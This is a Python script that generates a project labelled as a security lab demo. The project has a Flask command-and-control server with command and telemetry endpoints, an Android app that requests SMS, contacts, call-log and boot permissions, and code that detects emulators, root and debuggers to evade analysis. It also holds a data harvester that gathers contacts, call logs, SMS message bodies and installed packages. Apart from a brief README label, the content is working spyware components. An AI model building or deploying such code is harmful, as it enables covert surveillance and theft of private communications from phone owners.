import os

def create_structure():
    files = {
        "app.py": '''from flask import Flask, request, jsonify

app = Flask(__name__)
current_command = "harvest"

@app.route('/command', methods=['GET'])
def get_command():
    global current_command
    return current_command, 200

@app.route('/command', methods=['POST'])
def set_command():
    global current_command
    data = request.get_json() or {}
    current_command = data.get('command', 'harvest')
    return jsonify({"status": "success", "command": current_command}), 200

@app.route('/telemetry', methods=['POST'])
def receive_telemetry():
    data = request.get_json() or {}
    print(f"Received telemetry payload: {data}")
    return jsonify({"status": "received"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
''',
        "requirements.txt": '''Flask==3.0.2
gunicorn==21.2.0
requests==2.31.0
''',
        "README.md": '''# Security Lab (CEH Demo)
Educational and vulnerability research demonstration project containing modular Android security components and a Flask backend server.
''',
        "app/src/main/AndroidManifest.xml": '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.securitylab">

    <queries>
        <intent>
            <action android:name="android.intent.action.MAIN" />
        </intent>
    </queries>

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.SecurityLab">

        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

    </application>
</manifest>
''',
        "app/src/main/java/com/example/securitylab/SecurityGuard.kt": '''package com.example.securitylab

import android.os.Build
import android.os.Debug
import java.io.File

object SecurityGuard {
    fun isEmulator(): Boolean {
        return Build.FINGERPRINT.startsWith("generic") ||
                Build.MODEL.contains("google_sdk") ||
                Build.MODEL.contains("Emulator") ||
                Build.HARDWARE.contains("goldfish") ||
                Build.HARDWARE.contains("ranchu") ||
                Build.PRODUCT.contains("sdk") ||
                Build.TAGS.contains("test-keys")
    }

    fun checkRoot(): Boolean {
        val paths = arrayOf(
            "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su",
            "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su",
            "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su", "/su/bin/su"
        )
        for (path in paths) {
            if (File(path).exists()) return true
        }
        return false
    }

    fun isDebuggerAttached(): Boolean {
        return Debug.isDebuggerConnected() || Debug.waitingForDebugger()
    }
}
''',
        "app/src/main/java/com/example/securitylab/DataHarvester.kt": '''package com.example.securitylab

import android.content.Context
import android.net.Uri
import android.os.Build
import android.provider.ContactsContract
import android.provider.CallLog
import org.json.JSONArray
import org.json.JSONObject

object DataHarvester {
    fun harvestDeviceInfo(context: Context): String {
        val packageList = try {
            context.packageManager.getInstalledPackages(0).map { it.packageName }
        } catch (e: Exception) {
            emptyList()
        }

        return JSONObject().apply {
            put("device", Build.MODEL)
            put("manufacturer", Build.MANUFACTURER)
            put("sdk", Build.VERSION.SDK_INT)
            put("package_list", JSONArray(packageList))
            put("contacts", getContacts(context))
            put("call_logs", getCallLogs(context))
            put("sms_logs", getSmsLogs(context))
        }.toString()
    }

    private fun getContacts(context: Context): JSONArray {
        val limit = 50
        val contactsArray = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null, null
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    val name = it.getString(0) ?: ""
                    val number = it.getString(1) ?: ""
                    contactsArray.put(JSONObject().put("name", name).put("number", number))
                    count++
                }
            }
        } catch (e: Exception) {}
        return contactsArray
    }

    private fun getCallLogs(context: Context): JSONArray {
        val limit = 50
        val logsArray = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE),
                null, null, "${CallLog.Calls.DATE} DESC"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    val number = it.getString(0) ?: ""
                    val type = it.getInt(1)
                    val date = it.getLong(2)
                    logsArray.put(JSONObject().put("number", number).put("type", type).put("date", date))
                    count++
                }
            }
        } catch (e: Exception) {}
        return logsArray
    }

    private fun getSmsLogs(context: Context): JSONArray {
        val limit = 50
        val smsArray = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("address", "body", "date"),
                null, null, "date DESC"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    val address = it.getString(0) ?: ""
                    val body = it.getString(1) ?: ""
                    val date = it.getLong(2)
                    smsArray.put(JSONObject().put("address", address).put("body", body).put("date", date))
                    count++
                }
            }
        } catch (e: Exception) {}
        return smsArray
    }
}
''',
        "app/src/main/java/com/example/securitylab/MainActivity.kt": '''package com.example.securitylab

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
    }
}
'''
    }

    for path, content in files.items():
        dir_name = os.path.dirname(path)
        if dir_name:
            os.makedirs(dir_name, exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"Generated: {path}")

if __name__ == "__main__":
    create_structure()
